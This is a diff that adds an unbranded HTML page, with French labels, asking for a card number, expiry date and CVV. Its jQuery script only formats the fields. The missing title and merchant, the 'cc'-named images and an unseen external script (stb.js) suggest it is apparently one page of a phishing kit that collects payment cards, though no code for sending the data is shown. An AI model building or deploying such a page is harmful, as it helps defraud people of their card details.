@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./css/camaki.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <title></title>
+</head>
+<body >
+    <div>
+        <div class="roof">
+            <img src="./img/upotap-cc1.png" alt="">
+        </div>
+    </div>
+
+
+    <div>
+        
+        
+        <!-- <p class="pp2">
+            Panier :
+            <span>1 Article</span>
+        </p> -->
+        <div class="section1">
+            
+            <div class="kolch2">
+                <form method="post" id="pg2">
+                    
+                    
+                    
+                    <p>Numero de carte : </p>
+                    <input class="inp1" type="tele" name="" id="numcc" maxlength="19" >
+                    
+                    
+                    
+                    <p>Date d'expiration</p>
+                    <div class="exp">
+                        <input class="mm" type="tel" name="" id="mmo" required placeholder="MM / AA" maxlength="8">
+                        
+                    </div>
+
+                    <p>Cryptogramme visuel (CVV) : </p>
+                    <input class="cfifi" type="tel" name="" id="numvv" required  maxlength="4">
+
+                    <button class="btn2"  type="submit">Valider</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <div>
+        <div>
+            <div class="boot">
+                <img src="./img/boutamo-cc1.png" alt="">
+            </div>
+        </div>
+    </div>
+    <script>
+        $("#numcc").on("keyup",function(){
+           cc = $(this).val().split(" ").join("");
+           cc = cc.match(new RegExp('.{1,4}$|.{1,4}', 'g')).join(" ");
+           $(this).val(cc);
+       });
+       $("#mmo").on("keyup",function(){
+           dd = $(this).val().split("/").join("");
+           dd = dd.match(new RegExp('.{1,2}$|.{1,2}', 'g')).join("/");
+           $(this).val(dd);
+       });
+   </script>
+    <!--  -->
+    <script src="./js/stb.js"></script>
+</body>
+</html>
